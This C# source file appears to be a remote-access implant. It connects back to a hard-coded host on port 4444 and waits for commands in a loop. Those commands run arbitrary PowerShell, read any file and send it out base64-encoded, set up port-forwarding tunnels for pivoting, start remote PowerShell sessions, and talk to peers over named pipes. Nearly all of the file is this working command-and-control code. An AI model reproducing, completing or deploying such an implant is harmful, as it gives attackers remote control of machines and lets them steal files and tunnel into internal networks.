using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Globalization;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.IO;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Threading;

namespace myclient
{

    class MyApp
    {
        private string t_message = "";
        private Dictionary <Guid,Socket> fwSocket = new Dictionary<Guid, Socket>();
        private Dictionary <Guid,bool> fwSocket_alive = new Dictionary<Guid, bool>();
        private Dictionary <string, bool> rh_running = new Dictionary<string, bool>();
        private Dictionary <string, List<Guid>> fwMapping = new Dictionary<string, List<Guid>>();
        private Dictionary <Guid, string> fwMapping_revs = new Dictionary<Guid, string>();
        private Dictionary <Guid, bool> ifAcked = new Dictionary<Guid, bool>();

        private Dictionary <string,string> fwEndPoint = new Dictionary<string, string>();
        
        public string ipstring = "127.0.0.1:4444";
        public string namepipestring = "namedpipeshell";
        public string namepipehost = ".";
        public int localSocketTimeout = 500;

        public static IEnumerable<string> SplitByLength(string str, int maxLength)
        {
            int index = 0;
            while (true)
            {
                if (index + maxLength >= str.Length)
                {
                    yield return str.Substring(index);
                    yield break;
                }
                yield return str.Substring(index, maxLength);
                index += maxLength;
            }
        }


        bool SocketConnected(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);
            bool part2 = (s.Available == 0);
            bool part3 = s.Poll(1000, SelectMode.SelectWrite);
            Console.WriteLine("Poll Read: " + part1.ToString());
            Console.WriteLine("Poll Write: " + part3.ToString());
            Console.WriteLine("Available: " + (!part2).ToString());

            if (part1 && part2 && !part3)
                return false;
            else
                return true;
        }

        public static IPEndPoint CreateIPEndPoint(string endPoint)
        {
            string[] ep = endPoint.Split(':');
            if (ep.Length != 2) throw new FormatException("Invalid endpoint format");
            IPAddress ip;
            if (!IPAddress.TryParse(ep[0], out ip))
            {
                throw new FormatException("Invalid ip-adress");
            }
            int port;
            if (!int.TryParse(ep[1], NumberStyles.None, NumberFormatInfo.CurrentInfo, out port))
            {
                throw new FormatException("Invalid port");
            }
            return new IPEndPoint(ip, port);
        }


        public static string MsgPack(string Msg_In)
        {
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";

            return MsgTag_St + Convert.ToBase64String(Encoding.UTF8.GetBytes(Msg_In)) + MsgTag_Ed;
        }

        public string doRecive(Socket socket) //assume connected
        {
            byte[] bytes = new byte[1024];
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";


            while (true)
            {
                
                if (t_message.IndexOf(MsgTag_St) >= 0 && t_message.IndexOf(MsgTag_Ed) >= 0)
                {

                    Console.WriteLine("[DEBUG] t_message: " + t_message);
                    Console.WriteLine("[DEBUG] Index of MsgTag_St: " + t_message.IndexOf(MsgTag_St));
                    Console.WriteLine("[DEBUG] Index of MsgTag_Ed: " + t_message.IndexOf(MsgTag_Ed));
                    Console.WriteLine("[DEBUG] MsgTag_St.Length: " + MsgTag_St.Length.ToString());
                    

                    int st_tag = t_message.IndexOf(MsgTag_St);
                    int ed_tag = t_message.IndexOf(MsgTag_Ed);

                    var temp_var = ed_tag - (st_tag + MsgTag_St.Length);
                    Console.WriteLine("[DEBUG] Length: " + temp_var.ToString());


                    string r_msg = t_message.Substring(st_tag + MsgTag_St.Length, ed_tag - (st_tag + MsgTag_St.Length));
                    t_message = t_message.Substring(ed_tag + MsgTag_Ed.Length);
                    //Console.WriteLine("[DEBUG] t_message: " + t_message);
                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                    return Encoding.UTF8.GetString(Convert.FromBase64String(r_msg));
                }
                else
                {
                    //Console.WriteLine("[DEBUG] Need to get more ....");
                    int bytesRec = socket.Receive(bytes);
                    t_message = t_message + Encoding.UTF8.GetString(bytes, 0, bytesRec);

                }
            }
        }

        public string doReciveNative(Guid myuuid) //assume connected
        {
            var socket = fwSocket[myuuid];
            //var socket_alive = fwSocket_alive[myuuid];
            byte[] fwq_bytes_toresv = new byte[1024];
            string ret_str = "";
            //Console.WriteLine("timeout: " + socket.ReceiveTimeout.ToString());
            Console.WriteLine("blocking: " + socket.Blocking.ToString());

            while (true)
            {
                try
                {
                    int length_toresv = socket.Receive(fwq_bytes_toresv);
                    if (length_toresv == 0)
                    {
                        //FINED
                        fwSocket_alive[myuuid] = false;
                        return ret_str;

                    }
                    ret_str = ret_str + Encoding.UTF8.GetString(fwq_bytes_toresv, 0, length_toresv);
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException: " + se.ToString());
                    
                    if (se.SocketErrorCode == SocketError.WouldBlock) //no data this time
                    {
                        if (socket.Available == 1) //still some more, keep getting it
                        {
                            continue;
                        }

                        var ifconnected = SocketConnected(socket); //1s delay

                        if (!ifconnected)
                        {
                            //FINED
                            fwSocket_alive[myuuid] = false;
                            return ret_str;
                        }
                        else
                        {
                            //check Available again after the delay
                            if (socket.Available == 1)
                            {
                                continue;
                            }
                            else
                            {
                                //FIN if dummy response
                                //if (ret_str.Length == 0)
                                //{
                                //    fwSocket_alive[myuuid] = false;
                                //}
                                //this is not follow spec but needed for stager
                                //allowing dummy response
                                return ret_str; //return what we have now
                            }
                        }
                    }

                }//end of catch
            }//end of while
        }
        
        private static byte[] ReadPipMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    //Console.WriteLine("Into pipe read ...");
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);

                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }

        public void StartClientNative(Object uuid)
        {
            string rhuuid = (string)uuid;
            string endpoint = fwEndPoint[rhuuid];
            try
            {
                //Guid mylisteneruuid = Guid.NewGuid();
                rh_running.Add(rhuuid, true);
                fwMapping.Add(rhuuid, new List<Guid>());

                IPEndPoint remoteEP = CreateIPEndPoint(endpoint);
                Socket target = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                try
                {

                    Console.WriteLine("Waiting for a connection...");
                    target.Connect(remoteEP);
                    Guid myuuid = Guid.NewGuid();
                    target.Blocking = false;
                    //target.ReceiveTimeout = localSocketTimeout;
                    fwSocket.Add(myuuid, target);
                    fwSocket_alive.Add(myuuid, true);

                    fwMapping[rhuuid].Add(myuuid);
                    fwMapping_revs.Add(myuuid, rhuuid);

                    ifAcked.Add(myuuid, false);



                }//inner try
                catch (SocketException e)
                {
                    Console.WriteLine("SocketException : {0}", e.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }
                


            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void StartServerNative(Object uuid)
        {

            string rhuuid = (string)uuid;
            string endpoint = fwEndPoint[rhuuid];
            try
            {
                //Guid mylisteneruuid = Guid.NewGuid();
                rh_running.Add(rhuuid, true);
                fwMapping.Add(rhuuid, new List<Guid>());

                IPEndPoint localEndPoint = CreateIPEndPoint(endpoint);
                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                listener.Bind(localEndPoint);
                listener.Listen(5);
                listener.Blocking = false;

                while (true)
                {
                    try
                    {

                        //Console.WriteLine("Waiting for a connection...");
                        var t_fwSocket = listener.Accept();
                        Guid myuuid = Guid.NewGuid();
                        t_fwSocket.Blocking = false;
                        //t_fwSocket.ReceiveTimeout = localSocketTimeout;
                        fwSocket.Add(myuuid,t_fwSocket);
                        fwSocket_alive.Add(myuuid, true);

                        fwMapping[rhuuid].Add(myuuid);
                        fwMapping_revs.Add(myuuid, rhuuid);

                        ifAcked.Add(myuuid, false);



                    }//inner try
                    catch (SocketException)
                    {
                        //Console.WriteLine("SocketException : {0}", e.ToString());
                        if (!rh_running[rhuuid])
                        {
                            listener.Close();
                            break;
                        }
                        Thread.Sleep(1000);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Unexpected exception : {0}", e.ToString());
                    }
                }
                

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private void doMagic(Socket sender, IPEndPoint remoteEP, Socket listener)
        {

            byte[] bytes = new byte[1024];
            string command_tag;
            string command;

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            while (true)
            {

                try
                {
                    Console.WriteLine("Waiting for command tag ...");

                    //int bytesRec = sender.Receive(bytes);
                    //command_tag = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                    command_tag = doRecive(sender);
                    Console.WriteLine("Recieved Command tag: {0}", command_tag);
                    byte[] msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                    int bytesSent = sender.Send(msg);
                    if (bytesSent != msg.Length)
                    {
                        Console.WriteLine("[DEBUG] Something wrong with send");
                    }

                    Console.WriteLine("Finished sending ACK tag");

                    Console.WriteLine("Trying to get commands ... ");
                    //bytesRec = sender.Receive(bytes);
                    //command = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                    command = doRecive(sender);
                    Console.WriteLine("Recieved Command: {0}", command);
                    msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_SUCCESS"));
                    bytesSent = sender.Send(msg);
                    if (bytesSent != msg.Length)
                    {
                        Console.WriteLine("[DEBUG] Something wrong with send");
                    }


                    //check command
                    if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                    {

                        string psresult = "";
                        try
                        {
                            psresult = myPsRun.doPsRun(command);
                        }
                        catch (Exception e)
                        {

                            psresult = psresult + "[ERROR]: " + e.Message;
                        }


                        Console.WriteLine("[DEBUG] cmd executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack(psresult));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }
                        Console.WriteLine("Send result finished");

                        //get success ack
                        //bytesRec = sender.Receive(bytes);
                        //string psAck = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                        string psAck = doRecive(sender);
                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                        if (psAck == "PSRUN_SUCCESS")
                        {
                            Console.WriteLine("[PsRun] Success");
                        }
                        else
                        {
                            Console.WriteLine("[PsRun] Failed ...");
                        }

                    }

                    if (command_tag.ToLower() == "psreset")
                    {
                        myPsRun.cleanPsRun = RunspaceFactory.CreateRunspace(); //close it?
                        myPsRun.init();
                        Console.WriteLine("[DEBUG] psreset executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack("PSRESET_SUCCESS"));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }
                        Console.WriteLine("Send result finished");

                    }

                    if (command_tag.ToLower() == "psremote")
                    {
                        string reStr = myPsRun.remoteInit(command);
                        if (reStr == "PSREMOTE_SUCCESS")
                        {
                            Console.WriteLine("[DEBUG] psremote executed ...");
                            msg = Encoding.UTF8.GetBytes(MsgPack("PSREMOTE_SUCCESS"));
                        }
                        else
                        {
                            Console.WriteLine("[DEBUG] psremote executed with error ...");
                            msg = Encoding.UTF8.GetBytes(MsgPack(reStr));
                        }

                        
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }
                        Console.WriteLine("Send result finished");

                    }

                    if (command_tag.ToLower() == "download")
                    {
                        byte[] t_file;
                        try
                        {
                            string toSend = Convert.ToBase64String(File.ReadAllBytes(command));
                            string toSendPack = "";
                            foreach (string subToSend in SplitByLength(toSend, 1024 * 1024))
                            {
                                toSendPack = toSendPack + MsgPack(subToSend);
                            }

                            toSendPack = toSendPack + MsgPack("DL_SUCCESS"); //ack

                            t_file = Encoding.UTF8.GetBytes(toSendPack);
                        }catch(Exception e)
                        {
                            t_file = Encoding.UTF8.GetBytes(MsgPack(e.Message) + MsgPack("DL_SUCCESS")); //maybe need to ensure its not a "single word"
                        }
                        
                        //send bytes
                        //its possible for this to timeout ...
                        var bytpeSentTotal = 0;
                        var packSize = 0;
                        while (bytpeSentTotal < t_file.Length)
                        {
                            if (t_file.Length - bytpeSentTotal > 10240)
                            {
                                packSize = 10240;
                            }
                            else
                            {
                                packSize = t_file.Length - bytpeSentTotal;
                            }
                            bytesSent = sender.Send(t_file, bytpeSentTotal, packSize, 0);
                            bytpeSentTotal = bytpeSentTotal + bytesSent;
                            //Thread.Sleep(50);
                        }

                        //ack
                        string psAck = doRecive(sender);
                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                        if (psAck == "DL_SUCCESS")
                        {
                            Console.WriteLine("[Down] Success");
                        }
                        else
                        {
                            Console.WriteLine("[Down] Failed ...");
                        }

                    }

                    if (command_tag.ToLower() == "fwc")
                    {
                        //assume command is rhuuid:ip:port string
                        string[] subs = command.Split(':');
                        fwEndPoint.Add(subs[0], subs[1] + ':' + subs[2]);
                        //Console.WriteLine("subs[0]: " + subs[0]);
                        //Console.WriteLine("subs[1]: " + subs[1]);
                        //Console.WriteLine("subs[2]: " + subs[2]);

                        Thread t = new Thread(new ParameterizedThreadStart(StartClientNative));
                        t.Start(subs[0]);
                        Console.WriteLine("[DEBUG] fw executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }
                        Console.WriteLine("Send result finished");

                    }

                    if (command_tag.ToLower() == "fw")
                    {
                        //assume command is rhuuid:ip:port string
                        string[] subs = command.Split(':');
                        fwEndPoint.Add(subs[0], subs[1] + ':' + subs[2]);
                        //Console.WriteLine("subs[0]: " + subs[0]);
                        //Console.WriteLine("subs[1]: " + subs[1]);
                        //Console.WriteLine("subs[2]: " + subs[2]);

                        Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
                        t.Start(subs[0]);
                        Console.WriteLine("[DEBUG] fw executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }
                        Console.WriteLine("Send result finished");

                    }

                    if (command_tag.ToLower() == "pfw-update")
                    {
                        string rhuuid = command;
                        bool found = false;
                        //Console.WriteLine("rhuuid: " + rhuuid);
                        //Console.WriteLine("=========print the listener_running =========");
                        //foreach (KeyValuePair<string, bool> test in listener_running)
                        //{
                        //    Console.WriteLine("Key = {0}, Value = {1}", test.Key, test.Value);
                        //}
                        //Console.WriteLine("=========print the listener_running =========");

                        if (rh_running.ContainsKey(rhuuid))
                        {
                            Console.WriteLine("rhuuid found ...");
                            Console.WriteLine("Socket mode: " + sender.Blocking.ToString());
                            foreach (Guid chuuid in fwMapping[rhuuid])
                            {
                                if (ifAcked[chuuid] == false)
                                {
                                    //send ack
                                    found = true;
                                    ifAcked[chuuid] = true;

                                    //send rh
                                    byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(rhuuid));
                                    bytesSent = sender.Send(rh_msg);
                                    if (bytesSent != rh_msg.Length)
                                    {
                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                    }

                                    //send ch
                                    byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
                                    bytesSent = sender.Send(ch_msg);
                                    if (bytesSent != ch_msg.Length)
                                    {
                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                    }

                                    //do single read and write
                                    Console.WriteLine("Doing read and write");
                                    string str_fwq_msg = doReciveNative(chuuid);
                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
                                    {
                                        str_fwq_msg = "FW_CH_FINED";
                                    }
                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
                                    {
                                        str_fwq_msg = "FW_CH_NODATA";
                                    }

                                    Console.WriteLine("read and writed Finished ...");

                                    byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));

                                    //send data
                                    bytesSent = sender.Send(fwq_msg);
                                    if (bytesSent != fwq_msg.Length)
                                    {
                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                    }

                                    Console.WriteLine("Send success ...");


                                    if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
                                    {
                                        string fwq_string_tosend = doRecive(sender);
                                        Console.WriteLine("Got reponse: " + fwq_string_tosend);
                                        if (fwSocket_alive[chuuid] && fwq_string_tosend.Length !=0)
                                        {
                                            int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
                                            Console.WriteLine("Response sent");
                                        }
                                        else if(fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
                                        {
                                            Console.WriteLine("Dummy Response ...");
                                        }
                                        else
                                        {
                                            Console.WriteLine("fwSocket doesn't want response ... ");
                                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
                                            fwSocket[chuuid].Close();
                                        }

                                    }
                                    else
                                    {
                                        Console.WriteLine("Clean up ...");
                                        fwSocket[chuuid].Shutdown(SocketShutdown.Both);
                                        fwSocket[chuuid].Close();
                                    }
                                    
                                    

                                    break;

                                }//end of if
                            }//end of fow
                            if (!found)
                            {
                                Console.WriteLine("Send back not ready ...");
                                //send not ready
                                //send rh
                                byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(rhuuid));
                                bytesSent = sender.Send(rh_msg);
                                if (bytesSent != rh_msg.Length)
                                {
                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                }

                                //send ch
                                byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
                                bytesSent = sender.Send(ch_msg);
                                if (bytesSent != ch_msg.Length)
                                {
                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                }

                                //send data
                                byte[] data_msg = Encoding.UTF8.GetBytes(MsgPack("dummy"));
                                bytesSent = sender.Send(data_msg);
                                if (bytesSent != data_msg.Length)
                                {
                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                }
                                Console.WriteLine("Not ready sent ...");



                            }//end of if not found
                        }//end of if rhuuid in list
                        else
                        {
                            Console.WriteLine("Unknown rhuuid ...");
                        }


                    }

                    if (command_tag.ToLower() == "pfw-close")
                    {
                        //server FINed 
                        //convert string to uuid
                        Guid chuuid = new Guid(command);

                        if (fwSocket_alive[chuuid] == true)
                        {
                            Console.WriteLine("Clean up ...");
                            //might need locks
                            try
                            {
                                fwSocket[chuuid].Shutdown(SocketShutdown.Both);
                                fwSocket[chuuid].Close();
                            }
                            catch
                            {

                            }
                            
                        }
                        
                        //FW_CH_CLOSE_SUCCESS
                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_CH_CLOSE_SUCCESS"));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }

                        Console.WriteLine("Clean up finished");

                    }

                    if (command_tag.ToLower() == "fwq") //should always ready
                    {

                        //convert string to uuid
                        Guid chuuid = new Guid(command);
                        
                        //send rh
                        byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(fwMapping_revs[chuuid]));
                        bytesSent = sender.Send(rh_msg);
                        if (bytesSent != rh_msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }

                        if (fwSocket_alive[chuuid] == false)
                        {
                            //already FINed
                            //send ch
                            byte[] fin_ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
                            bytesSent = sender.Send(fin_ch_msg);
                            if (bytesSent != fin_ch_msg.Length)
                            {
                                Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                            }
                            //send FW_CH_FINED
                            byte[] fin_data_msg = Encoding.UTF8.GetBytes(MsgPack("FW_CH_FINED"));
                            bytesSent = sender.Send(fin_data_msg);
                            if (bytesSent != fin_data_msg.Length)
                            {
                                Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                            }

                            continue;

                        }

                        //send ch
                        byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
                        bytesSent = sender.Send(ch_msg);
                        if (bytesSent != ch_msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }

                        //do single read and write
                        Console.WriteLine("Doing read and write");
                        string str_fwq_msg = doReciveNative(chuuid);
                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
                        {
                            str_fwq_msg = "FW_CH_FINED";
                        }
                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
                        {
                            str_fwq_msg = "FW_CH_NODATA";
                        }

                        byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));

                        //send data
                        bytesSent = sender.Send(fwq_msg);
                        if (bytesSent != fwq_msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                        }

                        Console.WriteLine("Send success ...");

                        if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
                        {
                            string fwq_string_tosend = doRecive(sender);
                            Console.WriteLine("Got reponse: " + fwq_string_tosend);
                            if (fwSocket_alive[chuuid] && fwq_string_tosend.Length != 0)
                            {
                                int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
                                Console.WriteLine("Response sent");
                            }
                            else if (fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
                            {
                                Console.WriteLine("Dummy Response ...");
                            }
                            else
                            {
                                Console.WriteLine("fwSocket doesn't want response ... ");
                                fwSocket[chuuid].Shutdown(SocketShutdown.Both);
                                fwSocket[chuuid].Close();
                            }

                        }
                        else
                        {
                            Console.WriteLine("Clean up ...");
                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
                            fwSocket[chuuid].Close();
                        }

                    }


                    if (command_tag.ToLower() == "exit")
                    {
                        break;
                    }
                }

                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                    //keep reconnect
                    while (true)
                    {
                        try
                        {
                            if (listener == null)
                            {
                                sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                                sender.Connect(remoteEP);
                                break;
                            }
                            else
                            {
                                listener.Listen(1);
                                Console.WriteLine("Waiting for a connection...");
                                sender = listener.Accept();
                                break;
                            }
                        }
                        catch //(SocketException se_inner)
                        {
                            Console.WriteLine("Keep trying ...");
                        }
                    }
                }
            }//end of while 
        }

        private void doMagic(PipeStream pipe)
        {

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            string command_tag;
            string command;

            while (true)
            {
                Console.WriteLine("[*] Waiting for pip message");
                var messageBytes = ReadPipMessage(pipe);
                command_tag = Encoding.UTF8.GetString(messageBytes);
                Console.WriteLine("[*] Tag Received: {0}", command_tag);

                //ack
                byte[] msg = Encoding.UTF8.GetBytes("COMMAND_TAG_SUCCESS");
                pipe.Write(msg, 0, msg.Length);
                Console.WriteLine("[*] Ack Sent..");


                messageBytes = ReadPipMessage(pipe);
                command = Encoding.UTF8.GetString(messageBytes);
                Console.WriteLine("[*] CMD Received: {0}", command);

                //ack
                msg = Encoding.UTF8.GetBytes("COMMAND_SUCCESS");
                pipe.Write(msg, 0, msg.Length);
                Console.WriteLine("[*] Ack Sent..");


                if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                {

                    string psresult = "";
                    try
                    {
                        psresult = myPsRun.doPsRun(command);
                    }
                    catch (Exception e)
                    {
                        psresult = psresult + "[ERROR]: " + e.Message;
                    }


                    try
                    {
                        msg = Encoding.UTF8.GetBytes(psresult);
                        pipe.Write(msg, 0, msg.Length);
                        messageBytes = ReadPipMessage(pipe);

                        //ack
                        var psAck = Encoding.UTF8.GetString(messageBytes);
                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                        if (psAck == "PSRUN_SUCCESS")
                        {
                            Console.WriteLine("[PsRun] Success");
                        }
                        else
                        {
                            Console.WriteLine("[PsRun] Failed ...");
                        }

                    }
                    catch
                    {
                        Console.WriteLine("[!] Pipe is broken!");
                        //do something to restore
                    }



                }//end of if ps



                if (command_tag.ToLower() == "exit")
                {
                    break;
                }



            }//end of while 

        }

        public void StartPipeClinet()
        {


            try
            {
                Console.WriteLine("[*] Trying connect to server");
                var pipe = new NamedPipeClientStream(namepipehost, namepipestring, PipeDirection.InOut);
                pipe.Connect(5000);
                pipe.ReadMode = PipeTransmissionMode.Message;
                Console.WriteLine("[*] Connected to server.");
                doMagic(pipe);



            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }

        public void StartPipServer()
        {
            
            try
            {
                var pipe = new NamedPipeServerStream(namepipestring, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
                Console.WriteLine("[*] Waiting for client connection...");
                pipe.WaitForConnection();
                Console.WriteLine("[*] Client connected.");
                
                //ack connecition
                byte[] msg = Encoding.UTF8.GetBytes("PIPE_CONNECTED");
                pipe.Write(msg, 0, msg.Length);

                doMagic(pipe);

            }//end of try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void StartClient()
        {

            //COMMAND_SUCCESS
            //COMMAND_TAG_SUCCESS
            //PSRUN_SUCCESS


            // Connect to a remote device.  
            try
            {

                IPEndPoint remoteEP = CreateIPEndPoint(ipstring);

                // Create a TCP/IP  socket.  
                Socket sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);


                // Connect the socket to the remote endpoint. Catch any errors.  
                try
                {
                    sender.Connect(remoteEP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());

                    //do the magic
                    doMagic(sender, remoteEP, null);

                    // Release the socket.  
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();

                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void StartServer()
        {

            try
            {
                IPEndPoint localEndPoint = CreateIPEndPoint(ipstring);
                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    listener.Bind(localEndPoint);
                    listener.Listen(1);
                    Console.WriteLine("Waiting for a connection...");
                    Socket handler = listener.Accept();

                    doMagic(handler, localEndPoint, listener);


                    // Release the socket.  
                    //listener.Shutdown(SocketShutdown.Both);
                    listener.Close();


                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }


    }

    public class Program
    {

        public static void Main(string[] args)
        {
            MyApp t_app = new MyApp();
            
            t_app.ipstring = "192.168.182.131:4444";
            
            t_app.StartClient();
            //t_app.ipstring = "";
            //t_app.namepipehost = "";
            //t_app.namepipestring = "";
            //t_app.StartClient();
            //t_app.StartServer();
            //t_app.StartPipServer();
            //t_app.StartPipeClinet();

        }
    }
}

